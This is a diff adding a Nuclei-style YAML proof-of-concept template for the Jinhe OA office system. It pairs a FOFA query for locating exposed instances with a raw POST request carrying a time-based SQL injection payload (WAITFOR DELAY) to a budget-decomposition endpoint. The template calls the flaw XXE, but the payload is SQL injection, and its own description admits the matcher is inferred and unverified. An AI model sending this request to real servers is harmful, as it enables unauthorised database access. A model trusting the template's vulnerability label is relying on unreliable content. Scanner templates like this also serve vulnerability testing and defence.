@@ -1,0 +1,31 @@
+id: poc-xhl39y9bl99hl08w
+info:
+  name: 金和OA AjaxForCompanyBudgetDecompose存在XXE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xhl39y9bl99hl08w
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: xxe,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xhl39y9bl99hl08w
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'POST /c6/JHSoft.Web.CostControl/Decompose/AjaxForCompanyBudgetDecompose.ashx/ HTTP/1.1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+
+    strType=getBudgetTime&strYear=1;WAITFOR DELAY ''0:0:5''--'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
